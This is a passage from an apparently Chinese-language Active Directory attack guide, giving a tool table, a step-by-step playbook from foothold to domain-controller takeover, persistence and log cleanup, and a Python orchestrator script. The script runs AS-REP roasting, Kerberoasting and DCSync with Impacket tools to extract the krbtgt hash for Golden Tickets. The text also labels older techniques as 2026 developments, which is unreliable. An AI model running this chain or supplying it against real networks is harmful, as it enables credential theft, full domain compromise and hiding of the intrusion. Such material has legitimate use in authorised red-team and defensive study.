## 11. 自动化工具链与实战 SOP

### 11.1 工具速查表

| 阶段 | 工具 | 用途 |
|------|------|------|
| 侦察 | BloodHound/SharpHound | 攻击图分析 |
| 侦察 | PowerView/ADModule | 命令行枚举 |
| 侦察 | PingCastle | 域安全评估报告 |
| 凭据 | Impacket (GetNPUsers/GetUserSPNs/secretsdump) | AS-REP/Kerberoasting/哈希提取 |
| 凭据 | Rubeus | Kerberos攻击全套(Windows内) |
| 凭据 | Mimikatz | LSASS dump/票据/DCSync |
| 凭据 | lsassy/nanodump/pypykatz | 免杀dump与解析 |
| 中继 | ntlmrelayx/responder | NTLM中继与诱导 |
| 中继 | PetitPotam/Coercer | 强制认证触发 |
| ADCS | Certify/certipy/pywhisker | 证书模板枚举与攻击 |
| 横向 | Impacket (psexec/wmiexec/smbexec) | 远程执行 |
| 横向 | NetExec (原CrackMapExec) | 批量扫描与执行 |
| 提权 | Whisker/ShadowSpray | Shadow Credentials |
| 综合 | BloodHound+Rubeus+Impacket | 标准组合 |

### 11.2 实战 SOP：从外网到域控

```text
[阶段0] 初始立足
  └─ 外网漏洞/钓鱼获得一台域内主机shell
       └─ whoami /all + klist + 判断域 (§1.3)

[阶段1] 侦察 (§2)
  ├─ 上传SharpHound采集 → BloodHound分析最短路径
  ├─ PowerView枚举高价值账户/委派/ACL
  └─ 定位: 域管在哪登录(HasSession)/可Kerberoasting账户/ESC模板

[阶段2] 凭据获取 (§3)
  ├─ 无凭据: AS-REP Roasting + 密码喷洒
  ├─ 有普通用户: Kerberoasting
  └─ 有主机管理: LSASS dump提取凭据

[阶段3] 横向与提权 (§4-8)
  ├─ PtH/PtT/Overpass-the-Hash 横向到更多主机 (§6)
  ├─ BloodHound路径执行: ACL滥用/委派攻击 (§4.6/§7)
  ├─ NTLM Relay (PetitPotam触发) (§5)
  └─ ADCS ESC攻击 (§8)

[阶段4] 域控接管
  ├─ DCSync拉取krbtgt (§7.4)
  ├─ 或 PetitPotam+ADCS 链 (§5.5)
  └─ 或 2026新技术 noPac/Certifried (§9)

[阶段5] 持久化
  ├─ Golden/Diamond/Sapphire Ticket (§4.2/4.4/4.5)
  ├─ DCShadow静默植入 (§7.5)
  └─ Shadow Credentials后门 (§8.3)

[阶段6] 清理与报告
  ├─ 清除工具与日志痕迹
  └─ 生成攻击路径报告与修复建议
```

### 11.3 自动化域渗透编排示例

```python
#!/usr/bin/env python3
"""思念AD自动化渗透编排 — 从立足点到域控的自动攻击链"""
import subprocess
from dataclasses import dataclass
from typing import List

@dataclass
class ADCampaign:
    domain: str
    dc_ip: str
    initial_user: str
    initial_pass: str
    hashes: dict = None
    tickets: list = None

class SinianADOrchestrator:
    """思念AD攻击编排器 — 自动化执行侦察→凭据→提权→DC接管"""
    
    def __init__(self, campaign: ADCampaign):
        self.c = campaign
        self.recon = {}
        self.creds = {}
    
    def run_full_chain(self):
        print(f"[*] 思念AD编排器启动 — 目标域: {self.c.domain}")
        self._phase_recon()        # 侦察
        self._phase_credsteal()    # 凭据获取
        self._phase_privesc()      # 提权
        self._phase_dctakeover()   # DC接管
        self._phase_persist()      # 持久化
        return self._report()
    
    def _phase_recon(self):
        """侦察: Kerberoasting候选 + AS-REP候选 + ADCS模板"""
        print("[*] 阶段1: 域侦察")
        # AS-REP Roasting (无需凭据增强)
        r = subprocess.run(
            ["GetNPUsers.py", f"{self.c.domain}/", "-no-pass",
             "-dc-ip", self.c.dc_ip],
            capture_output=True, text=True)
        self.recon['asrep_candidates'] = r.stdout
        # Kerberoasting候选 (用初始凭据)
        r = subprocess.run(
            ["GetUserSPNs.py", f"{self.c.domain}/{self.c.initial_user}:{self.c.initial_pass}",
             "-dc-ip", self.c.dc_ip, "-request"],
            capture_output=True, text=True)
        self.recon['kerberoast_hashes'] = r.stdout
    
    def _phase_credsteal(self):
        """凭据获取: 爆破Kerberoasting哈希"""
        print("[*] 阶段2: 凭据获取与爆破")
        if self.recon.get('kerberoast_hashes'):
            # 写入文件供hashcat爆破
            with open('/tmp/tgs.txt', 'w') as f:
                f.write(self.recon['kerberoast_hashes'])
            # 实战中调用hashcat (此处省略)
    
    def _phase_privesc(self):
        """提权: 检查DCSync权限/ADCS"""
        print("[*] 阶段3: 提权路径探测")
        # 若初始账户有DCSync权限则直接拉取
        r = subprocess.run(
            ["secretsdump.py", f"{self.c.domain}/{self.c.initial_user}:{self.c.initial_pass}",
             "-just-dc", f"@{self.c.dc_ip}"],
            capture_output=True, text=True)
        if 'krbtgt' in r.stdout:
            self.creds['krbtgt'] = self._extract_hash(r.stdout, 'krbtgt')
            print("[+] DCSync成功，已获取krbtgt哈希")
    
    def _phase_dctakeover(self):
        """DC接管: 用krbtgt铸Golden Ticket"""
        if self.creds.get('krbtgt'):
            print("[*] 阶段4: Golden Ticket持久化")
            # ticketer.py 铸造 (此处省略详细参数)
    
    def _phase_persist(self):
        print("[*] 阶段5: 持久化完成")
    
    def _extract_hash(self, output, user):
        for line in output.splitlines():
            if line.lower().startswith(user.lower()):
                return line.split(':')[1] if ':' in line else line
        return None
    
    def _report(self):
        return {"domain": self.c.domain, "creds": list(self.creds.keys()),
                "recon": list(self.recon.keys())}

if __name__ == '__main__':
    c = ADCampaign(domain="corp.local", dc_ip="10.0.0.1",
                   initial_user="user", initial_pass="Pass123!")
    orch = SinianADOrchestrator(c)
    print(orch.run_full_chain())
```

---

